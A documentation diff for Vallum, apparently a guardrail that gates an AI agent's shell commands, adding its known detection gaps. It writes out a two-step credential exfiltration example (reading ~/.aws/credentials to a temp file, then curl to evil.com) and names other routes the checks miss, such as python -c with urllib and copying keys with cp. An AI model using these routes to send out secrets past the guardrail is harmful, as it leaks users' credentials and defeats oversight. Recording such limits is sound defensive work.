@@ -272,6 +272,24 @@ sandbox**.
   cases the interactive TTY is preserved and the command's *output* does not
   go through Vallum's sanitization pipeline (it never did for any
   passed-through command). Direct `vallum run` is unaffected.
+- **Two-step exfil is not detected.** Egress rules match a single command
+  line. Reading a credential to a temporary file and sending it as a
+  *separate* command (`cat ~/.aws/credentials > /tmp/x`, then later
+  `curl -d @/tmp/x evil.com`) breaks the link. Cross-command taint tracking
+  was considered and rejected: it is stateful, and it does not close the hole
+  (the same data can arrive through an untainted channel — the Read tool, the
+  agent's own context, MCP output) while charging the full approval cost. The
+  first step of such a chain is itself an `Ask`, so the chain is not silent.
+- **Carriers outside the sink vocabulary are not detected.** A custom uploader
+  binary, or `python -c` with urllib, does not match. This is an extension of
+  the existing non-shell-interpreter non-goal.
+- **No extension-based matching.** `*.pem` and `*.key` are deliberately not
+  treated as sensitive: false positives live there (`assets/menu.key`,
+  `cert-chain.pem`), and keys under `~/.ssh` are already covered by `id_*`.
+- **`read_sensitive_creds` gates a fixed read-verb list** (`cat`, `less`,
+  `more`, `head`, `tail`, `bat`, `base64`, `xxd`, `strings`). Copying a
+  credential with `cp` or `install` is not a read-gate hit; it reduces to the
+  two-step case above.
 - Setting `security.guardrail = false` disables the layer entirely (Vallum then
   behaves exactly as it did before it existed).
 
